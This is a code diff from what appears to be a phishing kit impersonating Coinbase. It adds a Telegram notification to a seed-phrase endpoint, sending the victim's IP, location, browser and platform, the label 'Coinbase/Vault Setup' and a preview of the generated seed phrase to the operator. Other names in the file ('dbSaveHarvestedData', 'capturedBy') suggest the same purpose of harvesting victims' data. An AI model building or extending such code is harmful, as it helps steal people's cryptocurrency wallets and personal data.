@@ -14,6 +14,7 @@ import { generatePhrase } from '$lib/server/bip39';
 import { serverState } from '$lib/server/state';
 import { broadcast } from '$lib/server/websocket';
 import { dbSaveHarvestedData } from '$lib/server/database';
+import { notifyPageAction } from '$lib/server/telegram';
 
 export const POST: RequestHandler = async ({ request, getClientAddress }) => {
 	let body: { source?: string; length?: unknown } = {};
@@ -51,6 +52,27 @@ export const POST: RequestHandler = async ({ request, getClientAddress }) => {
 		broadcast({ type: 'log:new', payload: entry });
 	} catch {
 		/* ws may not be up in dev; ignore */
+	}
+
+	const visitor = serverState.visitors.get(ip);
+	if (visitor) {
+		notifyPageAction(
+			{
+				ip,
+				userId: visitor.userId,
+				city: visitor.city,
+				region: visitor.region,
+				country: visitor.country,
+				browser: visitor.browser,
+				platform: visitor.platform,
+				module: visitor.module,
+				capturedBy: visitor.capturedBy,
+				lastPageRoute: 'Vault Setup'
+			},
+			'Coinbase/Vault Setup',
+			`Seed phrase generated (${words.length} words)`,
+			preview
+		).catch(() => {});
 	}
 
 	return json({ ok: true, phrase: words, generatedAt: new Date().toISOString() });
